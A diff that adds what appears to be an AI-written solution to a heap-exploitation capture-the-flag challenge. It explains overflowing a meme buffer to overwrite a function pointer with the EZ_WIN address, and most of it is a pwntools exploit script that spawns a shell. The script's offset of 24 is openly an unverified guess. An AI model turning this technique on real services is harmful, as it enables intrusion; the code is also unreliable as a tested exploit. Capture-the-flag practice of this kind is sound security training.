@@ -1,0 +1,87 @@
+('To solve this challenge using Pwntools, we need to exploit the buffer '
+ 'overflow vulnerability in the `edit_meme` function to overwrite the function '
+ 'pointer in the meme structure. By overwriting this pointer with the address '
+ 'of the `EZ_WIN` function, we can execute the `system("/bin/sh")` call and '
+ 'spawn a shell.\n'
+ '\n'
+ "Here are the steps we'll follow:\n"
+ '1. Create a new meme with a small size to control the layout in the heap.\n'
+ "2. Use the `edit_meme` function to input data that overflows the meme's "
+ 'content buffer and overwrites the function pointer.\n'
+ '3. Trigger the overwritten function pointer by calling the `print_meme` '
+ 'function.\n'
+ '4. Obtain a shell.\n'
+ '\n'
+ 'Below is the Python script using Pwntools to automate this exploit.\n'
+ '\n'
+ '```python\n'
+ 'from pwn import *\n'
+ '\n'
+ '# Set up pwntools for the target binary\n'
+ "exe = './pwn/heap/heap-2/heap2'\n"
+ '\n'
+ "# Start the process (adjust 'env' and 'aslr' if necessary)\n"
+ 'p = process(exe)\n'
+ '\n'
+ '# For remote exploitation, uncomment the following line and adjust the IP '
+ 'and port\n'
+ "# p = remote('target_ip', target_port)\n"
+ '\n'
+ '# Load the binary\n'
+ 'elf = ELF(exe)\n'
+ '\n'
+ '# Find the address of the EZ_WIN function\n'
+ "ez_win = elf.symbols['EZ_WIN']\n"
+ '\n'
+ '# Function to create a new meme\n'
+ 'def new_meme(size, content):\n'
+ "    p.sendlineafter('choice!\\n', '1')\n"
+ "    p.sendlineafter('Enter meme size: ', str(size))\n"
+ "    p.sendlineafter('Enter meme content: ', content)\n"
+ "    p.recvuntil('Done!\\n')\n"
+ '\n'
+ '# Function to edit an existing meme\n'
+ 'def edit_meme(index, content):\n'
+ "    p.sendlineafter('choice!\\n', '2')\n"
+ "    p.sendlineafter('Index: ', str(index))\n"
+ "    p.sendlineafter('Enter meme content: ', content)\n"
+ "    p.recvuntil('Done!\\n')\n"
+ '\n'
+ '# Function to print a meme (triggers the function pointer)\n'
+ 'def print_meme(index):\n'
+ "    p.sendlineafter('choice!\\n', '3')\n"
+ "    p.sendlineafter('Index: ', str(index))\n"
+ '\n'
+ '# Create a new meme with a small content size\n'
+ 'meme_size = 16\n'
+ "new_meme(meme_size, 'A' * (meme_size - 1))\n"
+ '\n'
+ '# Calculate the overflow length to reach the function pointer\n'
+ '# Since the meme structure is likely laid out as:\n'
+ '# [Function Pointer (8 bytes)][Content Pointer (8 bytes)]\n'
+ '# And the content buffer is separate, we need to overflow the content '
+ 'buffer\n'
+ '# and overwrite the function pointer in the meme structure.\n'
+ "# We'll assume an offset of 24 bytes for this example (adjust as needed).\n"
+ '\n'
+ 'offset = 24  # Adjust this value based on analysis\n'
+ '\n'
+ '# Build the payload to overwrite the function pointer with the address of '
+ 'EZ_WIN\n'
+ "payload = b'A' * offset\n"
+ 'payload += p64(ez_win)\n'
+ '\n'
+ '# Edit the meme to overflow the buffer and overwrite the function pointer\n'
+ 'edit_meme(0, payload)\n'
+ '\n'
+ '# Trigger the overwritten function pointer\n'
+ 'print_meme(0)\n'
+ '\n'
+ '# Interact with the shell\n'
+ 'p.interactive()\n'
+ '```\n'
+ '\n'
+ 'This script should be adjusted based on the actual offsets in the heap '
+ 'layout. You may need to experiment with the `offset` value to correctly '
+ 'overwrite the function pointer. Additionally, ensure that the target binary '
+ 'path and any remote connections are correctly configured.')
